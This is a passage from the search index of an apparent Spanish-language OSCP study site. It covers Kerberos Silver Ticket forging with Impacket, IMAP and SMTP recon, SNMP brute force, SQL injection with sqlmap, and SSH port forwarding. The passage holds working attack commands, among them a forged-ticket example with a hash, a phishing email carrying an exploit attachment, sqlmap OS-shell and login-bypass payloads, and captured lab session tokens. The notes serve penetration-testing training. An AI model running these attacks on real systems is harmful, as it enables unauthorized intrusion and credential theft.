enumeraci\u00f3n como <code>rpcclient</code> con credenciales de usuario est\u00e1ndar.      <pre><code>rpcclient -U \"&lt;DOMINIO&gt;/&lt;USUARIO&gt;%&lt;CONTRASE\u00d1A&gt;\" &lt;DC_IP&gt;\nrpcclient&gt; lookupnames &lt;NOMBRE_DOMINIO&gt;\n</code></pre></p> <ul> <li>El SID del dominio tiene el formato <code>S-1-5-21-&lt;n\u00fameros_espec\u00edficos_del_dominio&gt;</code>.</li> <li>Alternativamente, con PowerShell (si tienes acceso):    <pre><code>[System.Security.Principal.WindowsIdentity]::GetCurrent().User.AccountDomainSid\n</code></pre></li> </ul> </li> <li> <p>Obtener el SID de la cuenta de servicio:</p> </li> <li> <p>Usa <code>rpcclient</code> para enumerar el SID de la cuenta de servicio.      <pre><code>rpcclient -U \"&lt;DOMINIO&gt;/&lt;USUARIO&gt;%&lt;CONTRASE\u00d1A&gt;\" &lt;DC_IP&gt;\nrpcclient&gt; lookupnames &lt;NOMBRE_CUENTA_SERVICIO&gt;\n</code></pre></p> <ul> <li>El SID de la cuenta de servicio es el SID del dominio m\u00e1s un identificador relativo (RID), por ejemplo, <code>S-1-5-21-&lt;n\u00fameros_espec\u00edficos_del_dominio&gt;-&lt;RID&gt;</code>.</li> <li>Alternativamente, con PowerShell:    <pre><code>Get-ADUser -Identity &lt;NOMBRE_CUENTA_SERVICIO&gt; -Server &lt;DC_FQDN&gt; | Select-Object SID\n</code></pre></li> </ul> </li> <li> <p>Identificar el nombre del servicio:</p> </li> <li> <p>Enumera los SPN del servicio objetivo con <code>setspn</code> o consultas LDAP.      <pre><code>setspn -T &lt;DOMINIO&gt; -Q */*\n</code></pre></p> <ul> <li>Busca el SPN, por ejemplo, <code>MSSQLSvc/&lt;SERVIDOR_FQDN&gt;:&lt;PUERTO&gt;</code> para MSSQL.</li> <li>Con PowerShell:    <pre><code>Get-ADUser -Filter {ServicePrincipalName -like \"*\"} -Properties ServicePrincipalName | Where-Object { $_.ServicePrincipalName -like \"*&lt;SERVICIO&gt;*\" }\n</code></pre></li> </ul> </li> <li> <p>Nombre del dominio:</p> </li> <li> <p>Es el FQDN del dominio, por ejemplo, <code>example.com</code>. Esto suele obtenerse durante la enumeraci\u00f3n inicial.</p> </li> <li> <p>Nombre del servidor:</p> </li> <li>El FQDN del servidor que aloja el servicio, por ejemplo, <code>sqlserver.example.com</code>. Se obtiene del SPN o mediante enumeraci\u00f3n de red.</li> </ol>"},{"location":"OSCP/silverTicketAttack/#forjar-el-silver-ticket-con-impacket","title":"Forjar el Silver Ticket con Impacket","text":"<ol> <li>Crear el Silver Ticket:</li> <li> <p>Usa <code>ticketer.py</code> de Impacket para forjar el ticket Kerberos.      <pre><code>python3 ticketer.py -nthash &lt;NTLM_HASH&gt; -domain-sid &lt;SID_DOMINIO&gt; -domain &lt;NOMBRE_DOMINIO&gt; -spn &lt;NOMBRE_SERVICIO&gt; -user-id &lt;RID_CUENTA_SERVICIO&gt; &lt;USUARIO_OBJETIVO&gt;\n</code></pre></p> <ul> <li>Par\u00e1metros:</li> <li><code>-nthash</code>: El hash NTLM de la cuenta de servicio.</li> <li><code>-domain-sid</code>: El SID del dominio (sin el RID).</li> <li><code>-domain</code>: El FQDN del dominio (por ejemplo, <code>example.com</code>).</li> <li><code>-spn</code>: El nombre del servicio principal (por ejemplo, <code>MSSQLSvc/sqlserver.example.com:1433</code>).</li> <li><code>-user-id</code>: El RID de la cuenta de servicio (la \u00faltima parte del SID de la cuenta).</li> <li><code>&lt;USUARIO_OBJETIVO&gt;</code>: El usuario a impersonar (por ejemplo, <code>Administrator</code>).</li> <li>Ejemplo:    <pre><code>impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya-industries.com -user-id 500 Administrator\n</code></pre></li> <li>El user id 500 es el RID de la cuenta de administrador.</li> <li>Esto genera un archivo <code>.ccache</code> con el ticket forjado.</li> </ul> </li> <li> <p>Configurar la variable de entorno para el ticket Kerberos:</p> </li> <li> <p>Exporta el ticket para usarlo con otras herramientas de Impacket.      <pre><code>export KRB5CCNAME=$(pwd)/&lt;nombre_ticket&gt;.ccache\n</code></pre></p> </li> <li> <p>Realizar Pass-the-Ticket (PTT):</p> </li> <li>Usa una herramienta de Impacket como <code>mssqlclient.py</code>, <code>psexec.py</code> o <code>smbexec.py</code> para acceder al servicio objetivo con el ticket forjado.<ul> <li>Ejemplo para MSSQL:    <pre><code>python3 mssqlclient.py -k &lt;DOMINIO&gt;/&lt;USUARIO_OBJETIVO&gt;@&lt;SERVIDOR_FQDN&gt; -dc-ip &lt;DC_IP&gt;\n</code></pre></li> <li><code>-k</code>: Indica autenticaci\u00f3n Kerberos usando el ticket en <code>KRB5CCNAME</code>.</li> <li>Ejemplo:      <pre><code>python3 mssqlclient.py -k example/Administrator@sqlserver.example.com -dc-ip 192.168.1.10\n</code></pre></li> <li>Esto conecta al servicio MSSQL como el usuario impersonado (por ejemplo, <code>Administrator</code>).</li> </ul> </li> </ol>"},{"location":"OSCP/silverTicketAttack/#archivo-etckrb5userconf-o-etckrb5conf","title":"Archivo /etc/krb5user.conf o /etc/krb5.conf","text":"<ul> <li>Este archivo es necesario para que el ticket funcione correctamente.</li> </ul> <pre><code>[libdefaults]\n        default_realm = EXAMPLE.COM\n        kdc_timesync = 1\n        ccache_type = 4\n        forwardable = true\n        proxiable = true\n        rdns = false\n        dns_canonicalize_hostname = false\n        fcc-mit-ticketflags = true\n\n[realms]\n        EXAMPLE.COM = {\n                kdc = dc01.example.com\n        }\n\n[domain_realm]\n        .example.com = EXAMPLE.COM\n</code></pre>"},{"location":"OSCP/silverTicketAttack/#notas","title":"Notas","text":"<ul> <li>Aseg\u00farate de que el reloj del sistema est\u00e9 sincronizado con el controlador de dominio para evitar problemas con los tickets Kerberos.<ul> <li>Comando: <code>sudo ntpdate -u &lt;IP_DC&gt;</code> </li> </ul> </li> <li>El ticket forjado solo es v\u00e1lido para el servicio y servidor especificados.</li> <li>Prueba el ticket con herramientas como <code>mssqlclient.py</code> para MSSQL o con otras herramientas de Impacket para diferentes servicios (por ejemplo, <code>psexec.py</code> para CIFS).</li> <li>Si el ticket falla, verifica la precisi\u00f3n del SPN, el hash y los SIDs.</li> <li>Sin permisos de administrador, el \u00e9xito del ataque depende de obtener el hash NTLM mediante t\u00e9cnicas como Kerberoasting.</li> </ul>"},{"location":"OSCP/smtp/","title":"SMTP/POP/IMAP Mail Server Pentesting","text":""},{"location":"OSCP/smtp/#reconocimiento-en-imap","title":"Reconocimiento en imap","text":"<ul> <li>Chequear emails:<ul> <li><code>nc IP 143</code></li> <li><code>tag login mail password</code>: Para loguearse</li> <li><code>tag LIST \"\" \"*\"</code>: Para listar los mails</li> <li><code>tag SELECT INBOX</code>: Para seleccionar el inbox</li> <li><code>tag STATUS INBOX (MESSAGES)</code>: Para ver la cantidad de mails</li> <li><code>tag fetch 1 (BODY[1])</code>: Para ver el mail</li> <li><code>tag fetch 2:5 BODY[HEADER] BODY[1]</code>: Para ver el header de los mails</li> <li><code>tag FETCH 1:5 ENVELOPE</code>: Para ver el envelope de los mails</li> </ul> </li> </ul>"},{"location":"OSCP/smtp/#recon-automatico-de-imap","title":"Recon automatico de imap","text":"<ul> <li><code>imapsync</code>: Herramienta para sincronizar cuentas de imap. Puede ser \u00fatil para hacer un dump de los mails.</li> <li>imap-recon tool</li> </ul>"},{"location":"OSCP/smtp/#enviar-mails-desde-la-terminal","title":"Enviar mails desde la terminal","text":"<ul> <li><code>sendemail</code>: Herramienta para enviar mails desde la terminal. Puede ser \u00fatil para enviar mails de phishing o para hacer pruebas de seguridad. Ejemplo</li> </ul> <pre><code>sendemail -f 'jonas@localhost' \\\n-t 'mailadmin@localhost' \\\n-s 192.168.244.140:25 \\\n-u 'a spreadsheet' \\\n-m 'Please check this spreadsheet' \\\n-a exploit.ods\n</code></pre>"},{"location":"OSCP/snmpEnum/","title":"SNMP Enumeration","text":""},{"location":"OSCP/snmpEnum/#que-es-snmp","title":"Que es SNMP","text":"<ul> <li>SNMP (Simple Network Management Protocol) es un protocolo de red utilizado para la gesti\u00f3n y supervisi\u00f3n de dispositivos en una red IP. Permite a los administradores de red recopilar informaci\u00f3n sobre el estado y el rendimiento de los dispositivos, as\u00ed como realizar configuraciones remotas.</li> <li>SNMP se basa en un modelo cliente-servidor, donde los dispositivos de red act\u00faan como agentes SNMP y los sistemas de gesti\u00f3n SNMP act\u00faan como clientes. Los agentes SNMP recopilan informaci\u00f3n sobre el dispositivo y la env\u00edan al sistema de gesti\u00f3n SNMP cuando se solicita.</li> </ul>"},{"location":"OSCP/snmpEnum/#como-enumerar-snmp","title":"Como enumerar SNMP","text":"<ul> <li>SNMP puede ser utilizado para enumerar informaci\u00f3n sobre dispositivos de red, como routers, switches, servidores y otros dispositivos. La informaci\u00f3n que se puede obtener incluye:</li> <li>Informaci\u00f3n del sistema: nombre del host, ubicaci\u00f3n, contacto, etc.</li> <li>Informaci\u00f3n de la interfaz: estad\u00edsticas de tr\u00e1fico, estado de la interfaz, etc.</li> <li>Informaci\u00f3n de la memoria y CPU: uso de memoria, carga de CPU, etc.</li> <li>Informaci\u00f3n de la configuraci\u00f3n: configuraciones de red, rutas, etc.</li> </ul>"},{"location":"OSCP/snmpEnum/#primeros-pasos","title":"Primeros pasos","text":"<ul> <li>El protocolo SNMP es UDP, por lo tanto para que NMAP lo pueda escanear, se debe utilizar el flag <code>-sU</code> para escanear puertos UDP.<ul> <li><code>nmap -sU -p 161 &lt;IP&gt;</code>: Escanea el puerto 161 (puerto SNMP) en la direcci\u00f3n IP especificada.</li> </ul> </li> <li>Para enumerar SNMP, se puede utilizar la herramienta <code>snmpwalk</code>, que permite realizar consultas SNMP a un dispositivo y obtener informaci\u00f3n sobre \u00e9l. La sintaxis b\u00e1sica de <code>snmpwalk</code> es la siguiente:</li> <li>En primer lugar abrir: <code>sudo mousepad /etc/snmp/snmp.conf</code> y descomentar la linea <code>mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf</code> dentro del kali</li> <li>Luego descargar sudo apt install snmp-mibs-downloader</li> <li>Ahora por ejemplo podemos hacer: <code>snmpwalk -v2c -c public 10.10.11.248 -m all</code></li> <li>Para utilizar una versi\u00f3n multi threading podemos usar snmpbulkwalk, que es m\u00e1s r\u00e1pido que snmpwalk. La sintaxis b\u00e1sica de <code>snmpbulkwalk</code> es la siguiente:</li> <li><code>snmpbulkwalk -v2c -c public 10.10.11.248 -m all | tee snmp.txt</code><ul> <li>Esto lo que hace es guardar toda la info obtenida en un txt porque los logs son muy extensos.</li> </ul> </li> </ul>"},{"location":"OSCP/snmpEnum/#extras","title":"Extras","text":""},{"location":"OSCP/snmpEnum/#comandos-utiles-para-snmp-enumeration","title":"Comandos \u00fatiles para SNMP Enumeration","text":"<ul> <li> <p><code>snmpwalk -v2c -c public 10.80.50.8</code>     Devuelve informaci\u00f3n sobre interfaces de red, nombres de grupos, informaci\u00f3n de hardware y programas en ejecuci\u00f3n en la m\u00e1quina.</p> </li> <li> <p><code>snmpwalk -v2c -c public 10.80.50.8 hrSWInstalledName</code>     Muestra los programas en ejecuci\u00f3n en la m\u00e1quina.</p> </li> <li> <p><code>snmpwalk -v2c -c public 10.80.50.8 hrMemorySize</code>     Obtiene el tama\u00f1o de la memoria de la m\u00e1quina.</p> </li> <li> <p><code>snmpwalk -v2c -c public 10.80.50.8 sysContact</code>     Recupera la informaci\u00f3n de contacto del sistema.</p> </li> </ul>"},{"location":"OSCP/snmpEnum/#comandos-sobre-snmp-en-windows","title":"Comandos sobre SNMP en Windows","text":"<ul> <li> <p><code>nmap -sU -p 161 --script snmp-win32-services 10.80.50.8</code>     Enumera los servicios de Windows a trav\u00e9s de SNMP.</p> </li> <li> <p><code>nmap -sU -p 161 --script snmp-win32-users 10.80.50.8</code>     Enumera los usuarios en la m\u00e1quina objetivo.</p> </li> <li> <p><code>nmap -sU -p 161 --script smb-brute 10.80.50.8</code>     Realiza fuerza bruta sobre la cadena de comunidad SNMP.</p> </li> </ul>"},{"location":"OSCP/snmpEnum/#fuerza-bruta-de-cadenas-de-comunidad-snmp","title":"Fuerza bruta de cadenas de comunidad SNMP","text":"<ul> <li><code>onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt &lt;IP&gt;</code></li> <li><code>snmpbulkwalk -c &lt;COMMUNITY_STRING&gt; -v&lt;VERSION&gt; &lt;IP&gt;</code></li> <li><code>snmp-check &lt;IP&gt;</code></li> </ul>"},{"location":"OSCP/snmpEnum/#valores-mib","title":"Valores MIB","text":"MIB Value Par\u00e1metro de Windows 1.3.6.1.2.1.25.1.6.0 Procesos del Sistema 1.3.6.1.2.1.25.4.2.1.2 Programas en Ejecuci\u00f3n 1.3.6.1.2.1.25.4.2.1.4 Rutas de Procesos 1.3.6.1.2.1.25.2.3.1.4 Unidades de Almacenamiento 1.3.6.1.2.1.25.6.3.1.2 Nombre del Software 1.3.6.1.4.1.77.1.2.25 Cuentas de Usuario 1.3.6.1.2.1.6.13.1.3 Puertos TCP Locales"},{"location":"OSCP/snmpEnum/#fuerza-bruta-de-cadenas-de-comunidad","title":"Fuerza Bruta de Cadenas de Comunidad","text":"<pre><code># Crear archivo con cadenas de comunidad comunes\necho public &gt; community\necho private &gt;&gt; community\necho manager &gt;&gt; community\n\n# Generar lista de IPs\nfor ip in $(seq 1 254); do echo 10.11.1.$ip; done &gt; snmp-ips\n\n# Ejecutar fuerza bruta con onesixtyone\nonesixtyone -c community -i snmp-ips\n</code></pre>"},{"location":"OSCP/snmpEnum/#enumeracion-del-arbol-mib-completo","title":"Enumeraci\u00f3n del \u00c1rbol MIB Completo","text":"<pre><code># Enumerar todo el \u00e1rbol MIB\nsnmpwalk -c public -v1 $ip\n</code></pre>"},{"location":"OSCP/snmpEnum/#enumeracion-de-un-valor-mib-especifico","title":"Enumeraci\u00f3n de un Valor MIB Espec\u00edfico","text":"<pre><code># Enumerar un valor MIB espec\u00edfico\nsnmpwalk -c public -v1 $ip $MIB_Value\n</code></pre>"},{"location":"OSCP/snmpEnum/#comprobacion-snmp","title":"Comprobaci\u00f3n SNMP","text":"<pre><code># Utilizar snmp-check para obtener informaci\u00f3n detallada\nsnmp-check $ip\n</code></pre>"},{"location":"OSCP/sqli/","title":"SQL Injection","text":""},{"location":"OSCP/sqli/#sql-injection-fundamentals","title":"SQL Injection Fundamentals","text":"<ul> <li>Una inyecci\u00f3n SQL es una vulnerabilidad de seguridad que permite a un atacante interferir con las consultas que una aplicaci\u00f3n web realiza a su base de datos SQL.</li> <li>La inyecci\u00f3n SQL se produce cuando se insertan datos no validados en una consulta SQL.</li> <li>La inyecci\u00f3n SQL puede ser utilizada para leer, modificar y eliminar datos de una base de datos.</li> <li>La inyecci\u00f3n SQL puede ser utilizada para ejecutar comandos en el sistema operativo.</li> <li>Hay diferentes tipos de inyecciones SQL, como la inyecci\u00f3n SQL basada en errores, la inyecci\u00f3n SQL basada en tiempo y la inyecci\u00f3n SQL ciega. <ul> <li>union based SQL injection<ul> <li>ejemplo de payload: <code>1' UNION SELECT 1,2,3 --</code></li> </ul> </li> <li>error based SQL injection<ul> <li>ejemplo de payload: <code>1' AND 1=CONVERT(int, (SELECT @@version)) --</code></li> </ul> </li> <li>time based SQL injection<ul> <li>ejemplo de payload: <code>1' AND IF(1=1, SLEEP(5), 0) --</code></li> </ul> </li> <li>blind SQL injection<ul> <li>ejemplo de payload: <code>1' AND SLEEP(5) --</code></li> </ul> </li> </ul> </li> </ul>"},{"location":"OSCP/sqli/#deteccion-de-sql-injection","title":"Deteccion de SQL Injection","text":"<ul> <li>Generalmente al poner un <code>'</code> en un campo de texto y si la aplicaci\u00f3n devuelve un error de SQL, es probable que sea vulnerable a SQL Injection.</li> <li>Tambi\u00e9n se puede poner un comentario <code>--</code> como intento de primer payload.</li> <li>Otra forma de detectar SQL Injection es mediante la inyecci\u00f3n de comandos SQL en los campos de texto y observar si la aplicaci\u00f3n devuelve resultados inesperados.<ul> <li>\"Error: near line 1: near \"'\": syntax error\" es un mensaje de error com\u00fan que se obtiene cuando se inyecta un <code>'</code> en un campo de texto.</li> <li>Ejemplo: <code>1' OR '1'='1</code></li> <li>Otros ejemplos</li> </ul> </li> </ul>"},{"location":"OSCP/sqli/#login-bypass-sql-injection","title":"Login Bypass SQL Injection","text":"<ul> <li>La inyecci\u00f3n SQL se puede utilizar para eludir la autenticaci\u00f3n de un sistema.</li> <li>Ejemplo de payload: <code>admin' OR '1'='1</code><ul> <li>Si el usuario y la contrase\u00f1a son correctos, la consulta SQL se ver\u00e1 as\u00ed: <code>SELECT * FROM users WHERE username='admin' AND password='password'</code></li> <li>Esto genera una tautolog\u00eda que siempre es verdadera, entonces la va a tomar como verdadera y va a permitir el acceso. </li> </ul> </li> </ul>"},{"location":"OSCP/sqli/#sqli-manual","title":"SQLI manual","text":""},{"location":"OSCP/sqli/#sqlmap","title":"SQLMAP","text":"<ul> <li>SQLMAP es una herramienta de prueba de penetraci\u00f3n de c\u00f3digo abierto que automatiza el proceso de detecci\u00f3n y explotaci\u00f3n de vulnerabilidades de inyecci\u00f3n SQL.</li> </ul>"},{"location":"OSCP/sqli/#comandos-generales","title":"Comandos generales","text":"<ul> <li><code>sqlmap -u URL --dbs</code> para listar las bases de datos.</li> <li><code>sqlmap -r HTTP-REQUEST-FILE --dbs</code> para usar un archivo con la request.</li> <li><code>sqlmap -r HTTP-REQUEST-FILE --dbs --batch</code> para usar un archivo con la request y no hacer preguntas.</li> <li><code>sqlmap -r HTTP-REQUEST-FILE --dbs --batch --level=5 --risk=3</code> para usar un archivo con la request y no hacer preguntas, con nivel de riesgo y nivel de profundidad.</li> <li><code>sqlmap -r HTTP-REQUEST-FILE --dbs --batch --level=5 --risk=3  --current-user --current-db --is-dba</code> para usar un archivo con la request y no hacer preguntas, con nivel de riesgo y nivel de profundidad, y obtener informaci\u00f3n del usuario actual, base de datos actual y si es DBA.</li> </ul>"},{"location":"OSCP/sqli/#anti-csrf-token","title":"Anti-CSRF Token","text":"<ul> <li>Si la aplicaci\u00f3n web utiliza tokens CSRF, se puede usar el par\u00e1metro <code>--csrf-token</code> para especificar el token CSRF.</li> <li>Ejemplo: <code>sqlmap -u URL --csrf-token=CSRF-TOKEN --dbs</code></li> <li><code>sqlmap -u URL --randomize=rp --dbs</code> para randomizar el token CSRF.</li> <li><code>sqlmap -u URL --eval=\"import time; time.sleep(10)\" --csrf-token=CSRF-TOKEN --dbs</code> para evaluar un script de python y dormir el tiempo que se le pase como argumento.</li> </ul>"},{"location":"OSCP/sqli/#os-shell","title":"OS shell","text":"<ul> <li><code>sqlmap -u URL --os-shell</code> para obtener una shell en el sistema operativo.</li> </ul>"},{"location":"OSCP/sqli/#sqli-en-websockets","title":"SQLI en WebSockets","text":"<ul> <li>Dentro de los websockets se pueden realizar consultas SQL.</li> <li>Hay que estar atento al burp proxy para ver las peticiones y respuestas.</li> <li>sqlmap -u ws://soc-player.soccer.htb:9091 --data '{\"id\": \"*\"}' --dbs --threads 10 --level 5 --risk 3 --batch</li> </ul>"},{"location":"OSCP/sqli/#inyeccion-sql-de-segundo-orden","title":"Inyecci\u00f3n SQL de Segundo Orden","text":"<p>La inyecci\u00f3n SQL de segundo orden ocurre cuando los datos inyectados no se utilizan de inmediato, sino que se almacenan en la base de datos y se procesan posteriormente en una consulta SQL de manera insegura.</p>"},{"location":"OSCP/sqli/#ejemplo","title":"Ejemplo:","text":"<ol> <li>El atacante introduce datos maliciosos en un formulario que se almacenan en la base de datos.</li> <li> <p>M\u00e1s tarde, otra funcionalidad de la aplicaci\u00f3n utiliza esos datos almacenados en una consulta SQL sin validarlos, permitiendo la explotaci\u00f3n.</p> </li> <li> <p>Este tipo de inyecci\u00f3n es m\u00e1s dif\u00edcil de detectar, ya que el impacto no es inmediato y depende de c\u00f3mo la aplicaci\u00f3n maneje los datos almacenados.</p> </li> <li> <p><code>sqlmap -r update_genres.req --second-req=user-feed.req  --dbs --level 5 --risk 3 --batch --tamper=space2comment --random-agent</code></p> </li> <li>Siendo update_genres.req un archivo que contiene una petici\u00f3n HTTP POST de una api que actualiza algo, o sea que es muy probable que haga una consulta del tipo <code>UPDATE table SET column = value WHERE condition</code>.<ul> <li>Y la segunda petici\u00f3n que practicamente hace GET user feed, o sea que recarga/fetchea/actualiza la informaci\u00f3n en la aplicaci\u00f3n.</li> </ul> </li> </ol>"},{"location":"OSCP/sqli/#update_genresreq","title":"update_genres.req","text":"<pre><code>POST /api/v1/gallery/user/genres HTTP/1.1\nHost: 10.10.11.220\nContent-Length: 17\nX-XSRF-TOKEN: eyJpdiI6ImdtZ0VkQXI0aUZtTUVVNzZxUnF6VlE9PSIsInZhbHVlIjoiYmZTRGVOWmptTVN3S2NldGlZNWtxdkozYUF0N25HWXVuazRuL0hBTGo0QnRaSCsrVWhMNkNuV1ltaUhvbkxDbFlTaVJueFcvdVhvamFLbE9wREgxZkEvdjA0L0J0bWxvSWNma2VUZ3JyWXYraG1Vb1VZeVVqNXV0bDBtUStib0ciLCJtYWMiOiJjNWU2ZDkwYWM1MGQ3NDQ4MjE2ZTZhYmU0ZjRkNzU5NDhjZTNhODEzNzA1ZDlmY2UwOWNjNDM1OGYwYzdkMTdiIiwidGFnIjoiIn0=\nX-Requested-With: XMLHttpRequest\nAccept-Language: en-US,en;q=0.9\nAccept: application/json, text/plain, */*\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36\nOrigin: http://10.10.11.220\nReferer: http://10.10.11.220/gallery\nAccept-Encoding: gzip, deflate, br\nCookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ0MDQ3MzcwLCJleHAiOjE3NDQwNjg5NzAsIm5iZiI6MTc0NDA0NzM3MCwianRpIjoiNDB3T0RMR2l1Qkp1aFczTyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.N18GEbvP-Lpdcm-w0VsyqQ-Ihbyu5KYNq9obdXn65Aw; XSRF-TOKEN=eyJpdiI6ImdtZ0VkQXI0aUZtTUVVNzZxUnF6VlE9PSIsInZhbHVlIjoiYmZTRGVOWmptTVN3S2NldGlZNWtxdkozYUF0N25HWXVuazRuL0hBTGo0QnRaSCsrVWhMNkNuV1ltaUhvbkxDbFlTaVJueFcvdVhvamFLbE9wREgxZkEvdjA0L0J0bWxvSWNma2VUZ3JyWXYraG1Vb1VZeVVqNXV0bDBtUStib0ciLCJtYWMiOiJjNWU2ZDkwYWM1MGQ3NDQ4MjE2ZTZhYmU0ZjRkNzU5NDhjZTNhODEzNzA1ZDlmY2UwOWNjNDM1OGYwYzdkMTdiIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlJXOWRQK0tJbk1jaUhCZDRLYktQV2c9PSIsInZhbHVlIjoiYWh4TGJYb1BjcnhMN2VVMWp2YzJiSkJoc0lRbjEzRVgxalc3Sm9aUUoyVktwaG9vZUdyWmpqYTZVTjc1bUQ2VFExUDd0UTVXTVdRMkxTaExsNGdVR0kvUTMxNzNwQlloS25yczJvUHlFelFobVQ2YWo1ZzVOQUdxRE9HM28xdTciLCJtYWMiOiJiN2U3MmNlOWI3ODYzNDE0ZTNhNDlkMDBiNmUzYTcyN2EwZGM1NTA2Yjc0MDMzOWU4NDkyODg2Zjc5N2YwNTUyIiwidGFnIjoiIn0%3D\nConnection: keep-alive\n\n{\"genres\":\"test\"}\n</code></pre>"},{"location":"OSCP/sqli/#user-feedreq","title":"user-feed.req","text":"<pre><code>GET /api/v1/gallery/user/feed HTTP/1.1\nHost: 10.10.11.220\nX-XSRF-TOKEN: eyJpdiI6Im9JNktoUVE1cjA0NWpVMWlMcVdkbkE9PSIsInZhbHVlIjoiandkUFV2YTJIbTYwRjBiR0UyWG9HOUkxa1VtcDNJNGx4TWJDbU1FRnVURERWdThtdkR3TzJ4eXdENVNzcnNJcFpZanpWeFBPbzd1bUxHcVJzd0V4UmNsR0FDd29UbVNKVDcvUmtJN3BoVnBORnRxcHljTmJGTFdKbFFSOHF6MTciLCJtYWMiOiIwMGFhODg1NjcwZmExZDllMjNkYWQ2MzYwM2I2YjBkMjk4ZmNiZDBiZDZhOWMyOGE0NTMxOTViYjA3Y2UwNTVkIiwidGFnIjoiIn0=\nX-Requested-With: XMLHttpRequest\nAccept-Language: en-US,en;q=0.9\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36\nReferer: http://10.10.11.220/gallery\nAccept-Encoding: gzip, deflate, br\nCookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ0MDQ3MzcwLCJleHAiOjE3NDQwNjg5NzAsIm5iZiI6MTc0NDA0NzM3MCwianRpIjoiNDB3T0RMR2l1Qkp1aFczTyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.N18GEbvP-Lpdcm-w0VsyqQ-Ihbyu5KYNq9obdXn65Aw; XSRF-TOKEN=eyJpdiI6Im9JNktoUVE1cjA0NWpVMWlMcVdkbkE9PSIsInZhbHVlIjoiandkUFV2YTJIbTYwRjBiR0UyWG9HOUkxa1VtcDNJNGx4TWJDbU1FRnVURERWdThtdkR3TzJ4eXdENVNzcnNJcFpZanpWeFBPbzd1bUxHcVJzd0V4UmNsR0FDd29UbVNKVDcvUmtJN3BoVnBORnRxcHljTmJGTFdKbFFSOHF6MTciLCJtYWMiOiIwMGFhODg1NjcwZmExZDllMjNkYWQ2MzYwM2I2YjBkMjk4ZmNiZDBiZDZhOWMyOGE0NTMxOTViYjA3Y2UwNTVkIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjBlMDYybXlIRklhZHdVU0UrdGtFNEE9PSIsInZhbHVlIjoibEc5VU9FNDhISDdzUXdpYTJlcVBLK0xrbVhkeEVScndZVGcvRTl6Rm1iOVE3REV5bys2djdXWEQ4K0treVRWMEFzZkoxSGNmTTFwRzVraU1VYzBzRUpEcDM2WkxFT2xpUnFNVUFrVFQ2YktuT3hUQ3pkUkhSZCtWbDNvOXlCVi8iLCJtYWMiOiJkY2E0YmFmMWExZDdiZTcxNjUyZDUyZDE2MWMyZjk4OGUzZjM3NjZkNGY0ZWI2YmIwMTIzOTJmYzc4ODFmNjZiIiwidGFnIjoiIn0%3D\nConnection: keep-alive\n</code></pre>"},{"location":"OSCP/sqli/#payloads","title":"Payloads","text":"<pre><code>---\nParameter: JSON genres ((custom) POST)\n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)\n    Payload: {\"genres\":\"test') OR NOT 5455=5455 AND ('QYvP'='QYvP\"}\n\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: {\"genres\":\"test') AND (SELECT 5404 FROM (SELECT(SLEEP(5)))LAtK) AND ('ClJK'='ClJK\"}\n\n    Type: UNION query\n    Title: MySQL UNION query (NULL) - 5 columns\n    Payload: {\"genres\":\"test') UNION ALL SELECT NULL,CONCAT(0x7162787071,0x4a4268414d737150586b687553784e4d757851796e6c724c68666a646d4c4c706e78736c51435370,0x7171627671),NULL,NULL,NULL#\"}\n---\n</code></pre> <ul> <li>Entonces el comportamiento de la aplicaci\u00f3n es el siguiente:<ul> <li>Actualizas los g\u00e9neros de un usuario, y luego haces un GET a la api de user feed.</li> <li>La aplicaci\u00f3n hace un SELECT a la base de datos para obtener los g\u00e9neros del usuario y mostrarlos en la aplicaci\u00f3n.</li> </ul> </li> <li>La inyecci\u00f3n SQL de segundo orden se produce cuando la aplicaci\u00f3n almacena los datos inyectados en la base de datos y luego los utiliza en una consulta SQL sin validarlos.</li> <li>petici\u00f3n POST =&gt; Guardas una inyecci\u00f3n SQL en la base de datos.</li> <li>petici\u00f3n GET =&gt; La aplicaci\u00f3n hace un SELECT a la base de datos y muestra los datos inyectados en la aplicaci\u00f3n.</li> <li>La inyecci\u00f3n SQL de segundo orden se produce cuando la aplicaci\u00f3n almacena los datos inyectados en la base de datos y luego los utiliza en una consulta SQL sin validarlos.</li> </ul>"},{"location":"OSCP/sshPortForwardingProxychains/","title":"SSH Local Port Forwarding.","text":"<ul> <li>Caso de uso:<ul> <li>Ten\u00e9s una maquina victima con acceso SSH, tiene servicios locales como una base de datos MySQL la cual no se puede acceder desde el exterior, pod\u00e9s reenviar el acceso a ese puerto mediante ssh tunneling</li> </ul> </li> </ul> <p><code>ssh -L 3306:127.0.0.1:3306 ubuntu@IP</code> - Para chequear: <code>nmap -p3306 localhost</code></p> <ul> <li>Tambi\u00e9n se pueden reenviar varios puertos a la vez: <code>ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64</code></li> </ul>"},{"location":"OSCP/sshPortForwardingProxychains/#pivoting","title":"Pivoting","text":"<ul> <li>Pivoting es un poco m\u00e1s complejo, 